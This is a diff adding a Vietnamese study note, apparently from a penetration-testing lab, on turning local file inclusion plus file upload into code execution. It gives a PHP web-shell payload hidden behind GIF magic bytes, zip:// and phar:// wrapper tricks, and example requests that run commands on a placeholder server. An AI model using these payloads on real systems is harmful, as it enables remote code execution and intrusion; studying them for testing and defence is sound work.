@@ -1,0 +1,51 @@
+Khái niệm chính
+  File Upload: hầu hết web app cho phép người dùng upload file (ảnh đại diện, tài liệu…).
+  Nếu web app có LFI và cho phép upload file, attacker có thể:
+  Upload file chứa mã độc (ví dụ: PHP web shell).
+  Sau đó include file đó qua LFI để thực thi code.
+
+Các hàm/file inclusion hỗ trợ thực thi code
+  | Ngôn ngữ   | Hàm                       | Read Content | Execute | Remote URL |
+  | ---------- | ------------------------- | ------------ | ------- | ---------- |
+  | **PHP**    | include()/include\_once() | ✅            | ✅       | ✅          |
+  |            | require()/require\_once() | ✅            | ✅       | ❌          |
+  | **NodeJS** | res.render()              | ✅            | ✅       | ❌          |
+  | **Java**   | import                    | ✅            | ✅       | ✅          |
+  | **.NET**   | include                   | ✅            | ✅       | ✅          |
+
+Kỹ thuật tấn công chính
+  Malicious Image Upload
+    Upload file shell.gif chứa:
+    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+  Ảnh này vẫn có magic bytes GIF8 để qua kiểm tra định dạng.
+    Sau khi upload, include qua LFI:
+      http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+      Kết quả: thực thi lệnh id.
+
+Zip Upload (PHP zip:// wrapper)
+  Tạo file zip chứa web shell:
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+  Include bằng wrapper zip://:
+    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+    %23 = ký tự # để trỏ tới file bên trong zip.
+
+Phar Upload (phar:// wrapper)
+  Tạo file shell.phar rồi rename thành shell.jpg.
+  Upload và include:
+    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+    %2F = /, trỏ tới shell.txt chứa payload PHP.
+
+
+
+
+
+Làm lab mà nó lỗi méo hoạt động 
+
+
+
+
+
+
+
+
+
